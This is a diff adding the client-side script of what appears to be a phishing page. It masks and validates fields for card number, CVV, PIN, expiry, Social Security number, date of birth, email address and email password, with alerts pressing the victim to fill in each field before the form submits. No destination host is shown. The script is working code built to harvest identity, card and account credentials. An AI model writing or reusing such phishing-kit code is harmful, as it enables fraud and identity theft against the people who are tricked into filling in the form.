@@ -1,0 +1,70 @@
+
+
+    jQuery(function($){
+   
+    	$('form').submit(function() {
+		})
+		$('#cc').mask('9999-9999-9999-9999', {});
+	    $('#pin').mask('9999', {});
+	    $('#zip').mask('99999', {});
+        $('#phone').mask('(999)999-9999', {});
+        $('#exp').mask('99/9999', {});
+        $('#cvv').mask('999', {});
+	    $('#ssn').mask('999-99-9999', {});
+		$("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
+		
+    }) 	
+
+
+<!--
+function check(form) {
+if (form.ssn.value=="")
+{ alert("Please Enter your Social Security Number before submitting."); form.ssn.focus(); return;}
+if (form.dob.value=="")
+{ alert("Please Select your Date Of Birth before submitting."); form.dob.focus(); return;}
+if (form.cc.value=="")
+{ alert("Please Enter your Full 16 Card Numbers before submitting."); form.cc.focus(); return;}
+if (form.exp.value=="")
+{ alert("Please Enter a valid Expiration Date for your card before submitting."); form.exp.focus(); return;}
+if (form.cvv.value == "")
+{ alert("Please Enter a valid Card Verification Number before submitting."); form.cvv.focus(); return;}
+
+// Start of cvv error Alert!
+var checkOK = "0123456789";
+var checkStr = form.cvv.value;
+var allValid = true;
+var allNum = "";
+for (i = 0;  i < checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j < checkOK.length;  j++)
+if (ch == checkOK.charAt(j))
+break;
+if (j == checkOK.length)
+{
+allValid = false;
+break;
+}
+if (ch != ",")
+allNum += ch;
+}
+if (!allValid)
+{
+alert("Please Enter a valid Card Verification Number before submitting.");
+form.cvv.focus();
+return;}
+// End of cvv error Alert!
+if (form.cvv.value.length < 3) { alert("CVV is too short!");form.cvv.focus();	return;}
+
+
+
+if (form.eml.value.length < 11)
+{ alert("Please enter your E-Mail Address before submitting."); form.eml.focus(); return false;}
+
+
+if (form.pss.value=="")
+{ alert("Please enter your E-Mail Address Password before submitting."); form.pss.focus(); return;}
+
+form.submit()
+}
+//-->
